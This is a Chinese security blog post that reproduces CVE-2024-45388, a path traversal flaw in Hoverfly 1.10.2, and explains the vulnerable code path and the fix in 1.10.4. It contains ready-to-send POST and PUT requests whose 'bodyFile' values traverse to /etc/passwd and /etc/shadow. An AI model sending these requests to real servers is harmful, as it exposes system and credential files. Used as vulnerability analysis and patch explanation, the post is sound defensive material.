#  Hoverfly 任意文件读取漏洞(CVE-2024-45388)   
原创 标准云  蚁景网络安全   2024-10-12 17:36  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5znJiaZxqldyq3SBEPw0n6hCXNk6PmR3gyPFJDUCibH91GiaAHHKiaCpcsfnQJ2oImQunzubgDtpxzxNHONU88CypA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
## 漏洞简介  
  
Hoverfly 是一个为开发人员和测试人员提供的轻量级服务虚拟化/API模拟/API模拟工具。其 /api/v2/simulation 的 POST 处理程序允许用户从用户指定的文件内容中创建新的模拟视图。然而，这一功能可能被攻击者利用来读取 Hoverfly 服务器上的任意文件。尽管代码禁止指定绝对路径，但攻击者可以通过使用 ../ 段来逃离 hf.Cfg.ResponsesBodyFilesPath 基本路径，从而访问任何任意文件。  
## 环境搭建  
  
我们还是利用 docker 来搭建环境  
  
https://hub.docker.com/r/spectolabs/hoverfly/tags  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZaibicZbH37cmxhebroNxNvVamfsMZonzXicLnrc5rSLC02xBZAsYZr9rw/640?wx_fmt=other&from=appmsg "null")  
  
```
docker pull spectolabs/hoverfly:v1.10.2
docker run -d -p 8888:8888 -p 8500:8500 spectolabs/hoverfly:v1.10.2   
```  
  
‍  
## 漏洞复现  
  
构造数据包  
```
POST /api/v2/simulation HTTP/1.1
Host:127.0.0.1:8888
Accept: application/json, text/plain,*/*
User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/85.0.4183.83Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8888/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length:126
Content-Type: application/x-www-form-urlencoded

{"data":{"pairs":[{
"request":{},"response":{
"bodyFile":"../../../../../etc/passwd"}}]},"meta":{"schemaVersion":"v5.2"}}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZRV2ZnIfHbH4fVlYVRbQxdJpAKCeNaFficWEPticicFQu98P3Yq1zRb4iaA/640?wx_fmt=other&from=appmsg "null")  
  
  
‍  
```
PUT /api/v2/simulation HTTP/1.1
Host:127.0.0.1:8888
Accept: application/json, text/plain,*/*
User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/85.0.4183.83Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8888/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length:126
Content-Type: application/x-www-form-urlencoded

{"data":{"pairs":[{
"request":{},"response":{
"bodyFile":"../../../../../etc/shadow"}}]},"meta":{"schemaVersion":"v5.2"}}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZoO1JyvDl6FOKzwrNKASEQEIAu8VyegK8ef9PibiblwE73zpDmtuJ4bfA/640?wx_fmt=other&from=appmsg "null")  
  
## 漏洞分析  
  
hoverfly-1.10.2\core\handlers\v2\simulation_handler.go#RegisterRoutes  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZCZG8kI4zqtfV36jjzawzzVBtTfPxPseCqM2JTx1DbtwSGUecNpOYmw/640?wx_fmt=other&from=appmsg "null")  
  
  
定义了 SimulationHandler 的路由注册方法，路由的每个 HTTP 方法（如 GET、PUT、POST、DELETE 等）都有一个对应的处理函数 (this.Get、this.Put、this.Post、this.Delete、this.Options、this.GetSchema)。这些函数处理实际的业务逻辑。  
- • GET /api/v2/simulation: 处理获取模拟数据。  
  
- • PUT /api/v2/simulation: 处理更新模拟数据。  
  
- • POST /api/v2/simulation: 处理创建新的模拟数据。  
  
- • DELETE /api/v2/simulation: 处理删除模拟数据。  
  
- • OPTIONS /api/v2/simulation: 提供有关 /api/v2/simulation 端点允许的 HTTP 方法的信息。  
  
- • GET /api/v2/simulation/schema: 获取模拟数据的 schema（结构）。  
  
- • OPTIONS /api/v2/simulation/schema: 提供有关 /api/v2/simulation/schema 端点允许的 HTTP 方法的信息。  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZQgnia6XCzKXYqC9bDLUO7iaflXSnwAVp6u9ED3KticrCX4HIgDGdYKC6w/640?wx_fmt=other&from=appmsg "null")  
  
  
POST 和 PUT 方法 仅仅是函数的第三个参数有所不同，所以两种请求方式都可以实现任意文件读取  
  
hoverfly-1.10.2\core\handlers\v2\simulation_handler.go#addSimulation  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZlymv4fprpciaCeON3rmAia6fDFIzrtG9Gx2EvNfUKGB0s9AF36hVgQsQ/640?wx_fmt=other&from=appmsg "null")  
  
  
第三个参数的不同导致 PUT 方法在获取新的模型内容时，首先删除前一个模拟内容，可以重复读取不同文件内容。POST 仅仅只能读取一次文件内容，无法更新。  
  
hoverfly-1.10.2\core\hoverfly_service.go#PutSimulation  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZqQVR7Kicf5ibzVDh62UdasNGI9ibibictvibsOb3KcxwT6hRXg7mbPopKkJw/640?wx_fmt=other&from=appmsg "null")  
  
  
hoverfly-1.10.2\core\hoverfly_service.go#putOrReplaceSimulation  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZIThdTRfjKkVN9JhibyTlb5aoHfqfonwdNZBVHGOwibdelI1yEniax7Wyw/640?wx_fmt=other&from=appmsg "null")  
  
  
hoverfly-1.10.2\core\hoverfly_funcs.go#readResponseBodyFiles  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZVURIw08bQiciaNHfSzATtv8TLt3owz9gBPCtcclLUohUX8XS6tUyafEw/640?wx_fmt=other&from=appmsg "null")  
  
  
hoverfly-1.10.2\core\hoverfly_funcs.go#readResponseBodyFile  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZ9kp3zMoldKXauticy3q62MSwmibfmibWetJa5NR9Ziavicg6g4BMyAqKzGQ/640?wx_fmt=other&from=appmsg "null")  
  
  
这里就是漏洞产生的关键原因，对传入的参数 filePath 没有做具体的校验，可以通过 ../ 实现跨越目录的读取文件  
  
我们看到最新版已经对传入的参数进行了处理  
  
hoverfly-1.10.4\core\hoverfly_funcs.go#readResponseBodyFile  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZo4tA2FzymufuxoUXefSwib9pXYAZdRDicCpzy6lwySK2I2dfeOCxE72g/640?wx_fmt=other&from=appmsg "null")  
  
  
hoverfly-1.10.4\core\util\util.go#ResolveAndValidatePath  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldz2XPeh2AuaOejo1fibxEZyZW1ib64wFV9cW0pm5DM1wtukPv22jP5EvRlD5EmORYtVp3ZmMpZJxBOw/640?wx_fmt=other&from=appmsg "null")  
  
  
这个 ResolveAndValidatePath 函数用于从一个绝对路径（absBasePath）解析一个相对路径（relativePath），并验证这个相对路径是否合法。具体来说，它确保了相对路径不会尝试向上回溯（使用 ".."），并且解析后的路径仍然在基路径之下。  
  
[](http://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&chksm=c160f8e6f61771f0fec6a865b8f6f645128bd3f48035546980afeebcc974b4f76538c7561d55&scene=21#wechat_redirect)  
  
  
